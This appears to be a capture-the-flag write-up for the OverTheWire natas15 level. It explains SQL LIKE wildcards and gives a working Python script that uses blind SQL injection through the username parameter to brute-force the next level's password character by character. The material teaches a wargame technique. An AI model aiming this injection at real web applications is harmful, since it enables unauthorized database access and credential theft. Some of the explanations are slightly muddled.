# natas15

The first we see the Source code, which tells us we only have `username` where we can try SQLi. 
Now when we put `natas15`, the user doesn't exist but `natas16` does. This gives us the clue that we may get the password of natas16 using natas16. By that I mean, if i am in natas15, i can see the password of natas15 in Source code. 
<br>
Now here is a concept of SQL wer should know. If we want to guess that if username="something" and password has "a" or begins with "a". We use the below idea-

```sql
-- EXAMPLE
-- when we want "a" to exist somewhere in password
select * from users where username="name" and password like "%a%"; 
-- when we want password to start with "test"
select * from users where username="name" and password like "test%"; 
-- when we want password to end with "test"
select * from users where username="name" and password like "%test"; 
-- The dollar assume "anything" plus "your_given_string"
```
Since the source code mentions we have table with username(64 char max) and password(64 char max),
This case is called BLIND SQLi, cause we can't figure out what to do. Nothing usual works.<br>
Now we will write a python code using 2nd example which will give us the password. This is basically brute forcing the password.
<br>
The code useful will be-

```python
import requests
import string

url = 'http://natas15.natas.labs.overthewire.org/'
auth = ('natas15', '<password>')  # replace <password> with the actual password
characters = string.ascii_letters + string.digits
known_password = ''

session = requests.Session()
session.auth = auth

for i in range(32):  # assuming the password is 32 characters long
    for char in characters:
        sql = f'natas16" AND password LIKE BINARY "{known_password}{char}%'
        response = session.get(url, params={'username': sql})
        if 'This user exists.' in response.text:
            known_password += char
            print(known_password)
            break

print(known_password)
```
This code will print out the password for natas16 and we are done.